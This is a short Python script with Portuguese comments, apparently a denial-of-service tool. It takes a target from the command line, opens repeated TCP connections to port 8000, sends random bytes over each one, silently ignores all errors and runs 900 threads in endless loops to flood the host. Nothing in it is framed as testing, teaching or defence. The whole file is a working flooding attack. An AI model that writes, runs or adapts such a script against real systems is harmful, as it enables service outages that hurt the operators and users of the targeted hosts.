import socket
import random
import threading
import sys

# O alvo é passado como argumento via linha de comando
TARGET = sys.argv[1]
PORT = 8000 # Porta padrão HTTP
# vou alterar para seleção de portas

def attack():
    while True:
        try:
            # Criação de socket TCP para flooding
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            # Envia um payload aleatório para saturar a conexão
            s.sendto(random._urandom(1024), (TARGET, PORT))
            s.close()
        except:
            pass

# Inicia centenas de threads para maximizar as requisições (troquei de 500 pra 900)
for i in range(900): 
    thread = threading.Thread(target=attack)
    thread.start()
